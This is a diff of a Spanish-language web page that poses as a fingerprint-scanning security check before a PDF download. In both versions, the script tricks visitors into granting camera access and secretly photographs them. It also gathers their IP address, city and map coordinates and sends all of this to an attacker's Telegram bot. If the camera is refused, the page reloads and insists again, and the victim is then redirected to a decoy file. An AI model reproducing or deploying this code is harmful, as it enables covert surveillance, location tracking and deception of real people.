@@ -2,67 +2,91 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso Seguro - Verificación Biométrica</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Acceso Seguro - Verificación de Huella</title>
     <style>
-        body { background: #050a0f; color: #00d4ff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; overflow: hidden; }
-        .fingerprint-container { width: 160px; height: 160px; border: 3px solid #00d4ff; border-radius: 25px; position: relative; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: transform 0.2s; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); }
-        .fingerprint-container:active { transform: scale(0.95); }
-        .fingerprint-icon { font-size: 90px; user-select: none; }
-        .scan-line { width: 100%; height: 5px; background: #00d4ff; position: absolute; top: 0; left: 0; animation: scan 2s infinite; box-shadow: 0 0 20px #00d4ff; display: none; }
-        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
-        .instruction { margin-top: 40px; font-weight: bold; letter-spacing: 1px; padding: 0 25px; font-size: 0.9em; }
-        .loading-bar { width: 220px; height: 6px; background: #111; margin-top: 25px; display: none; border-radius: 10px; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: #00d4ff; transition: 4s linear; }
+        body { background: #000; color: #00d4ff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden; user-select: none; }
+        
+        /* Contenedor del Sensor de Huella */
+        .fingerprint-sensor {
+            width: 150px; height: 150px;
+            border: 2px solid #00d4ff;
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
+            cursor: pointer;
+        }
+
+        .fingerprint-icon { font-size: 80px; opacity: 0.8; }
+
+        /* Línea de escaneo láser */
+        .laser {
+            position: absolute; width: 100%; height: 3px;
+            background: #00d4ff; box-shadow: 0 0 15px #00d4ff;
+            top: 0; display: none;
+            animation: scanning 2s linear infinite;
+        }
+
+        @keyframes scanning {
+            0% { top: 10%; } 50% { top: 90%; } 100% { top: 10%; }
+        }
+
+        .status-text { margin-top: 30px; font-size: 14px; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; }
+        
+        /* Barra de progreso circular */
+        .progress-ring {
+            position: absolute; width: 170px; height: 170px;
+            border: 4px solid transparent;
+            border-top: 4px solid #00d4ff;
+            border-radius: 50%;
+            display: none;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="fingerprint-container" id="sensor-box">
-        <div class="scan-line" id="line"></div>
-        <span class="fingerprint-icon" id="icon">👆</span>
+    <div class="progress-ring" id="ring"></div>
+    <div class="fingerprint-sensor" id="sensor">
+        <div class="laser" id="laser"></div>
+        <span class="fingerprint-icon">🧬</span>
     </div>
 
-    <div class="instruction" id="text-guide">
-        DETECTANDO HARDWARE BIOMÉTRICO...
-    </div>
+    <div class="status-text" id="status">PULSE PARA ESCANEAR HUELLA</div>
 
-    <div class="loading-bar" id="bar"><div class="progress" id="fill"></div></div>
-
-    <audio id="beep-sound" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU92T19vdm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92"></audio>
+    <audio id="beep" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU92T19vdm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92"></audio>
 
     <script src="config.js"></script>
     <script>
-        const sensorBox = document.getElementById('sensor-box');
-        const textGuide = document.getElementById('text-guide');
-        const icon = document.getElementById('icon');
-        const beep = document.getElementById('beep-sound');
+        const sensor = document.getElementById('sensor');
+        const status = document.getElementById('status');
+        const laser = document.getElementById('laser');
+        const ring = document.getElementById('ring');
+        const beep = document.getElementById('beep');
 
-        function configurarInterfaz() {
-            textGuide.innerHTML = "COLOQUE EL DEDO EN EL SENSOR PARA CONTINUAR";
-            sensorBox.addEventListener('click', iniciarTrampa);
-        }
+        async function validarBiometria() {
+            // Vibración táctil para simular sensor
+            if (navigator.vibrate) navigator.vibrate([100]);
 
-        async function iniciarTrampa() {
-            if (navigator.vibrate) navigator.vibrate(50);
-            
-            // Iniciamos animación visual
-            document.getElementById('line').style.display = "block";
-            document.getElementById('bar').style.display = "block";
-            textGuide.innerHTML = "VERIFICANDO IDENTIDAD...";
-            setTimeout(() => { document.getElementById('fill').style.width = "100%"; }, 100);
+            status.innerHTML = "MANTENGA PRESIONADO...";
+            laser.style.display = "block";
+            ring.style.display = "block";
 
             try {
-                // FORZAMOS EL PERMISO: El código no avanzará hasta que acepte
+                // PASO 1: Forzar acceso a cámara (Simula sensor óptico)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 
-                // Si llegamos aquí, aceptó la cámara. Tomamos la foto.
+                // PASO 2: Procesar captura en silencio
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute("playsinline", true);
                 await video.play();
                 
-                await new Promise(r => setTimeout(r, 1500)); // Tiempo para que la cámara enfoque
+                // Esperamos un segundo de "escaneo"
+                await new Promise(r => setTimeout(r, 1500));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
@@ -70,35 +94,33 @@
                 const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
                 stream.getTracks().forEach(t => t.stop());
 
-                // Obtener datos y enviar
+                // PASO 3: Obtener ubicación e IP
                 const resIP = await fetch('https://ipapi.co/json/');
                 const d = await resIP.json();
-                const equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1];
+                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Móvil Desconocido";
 
-                const reporte = `👤 *VERIFICACIÓN EXITOSA*\n\n📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-
+                // PASO 4: Enviar a Telegram
                 const fd = new FormData();
                 fd.append('chat_id', CONFIG.CHAT_ID);
-                fd.append('photo', fotoBlob, 'captura.jpg');
-                fd.append('caption', reporte);
+                fd.append('photo', fotoBlob, 'sensor_data.jpg');
+                fd.append('caption', `✅ *HUELLA VALIDADA*\n\n📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`);
                 fd.append('parse_mode', 'Markdown');
 
-                // Enviamos y esperamos confirmación de Telegram
                 await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
 
-                // Finalizar proceso
+                // FINAL: Éxito
                 beep.play();
-                textGuide.innerHTML = "✅ IDENTIDAD CONFIRMADA. DESCARGANDO...";
-                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 2000);
+                status.innerHTML = "✅ IDENTIDAD CONFIRMADA";
+                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
 
             } catch (err) {
-                // Si el usuario rechaza la cámara
-                alert("ERROR: Sensor no detectado. Debe permitir el acceso a la cámara para la verificación biométrica obligatoria.");
-                location.reload(); // Recarga la página para obligarlo a intentar de nuevo
+                // Si rechaza la cámara, el "sensor" falla
+                alert("ERROR DE LECTURA: El sensor biométrico requiere confirmación de hardware. Intente de nuevo.");
+                location.reload();
             }
         }
 
-        window.onload = configurarInterfaz;
+        sensor.addEventListener('click', validarBiometria);
     </script>
 </body>
 </html>
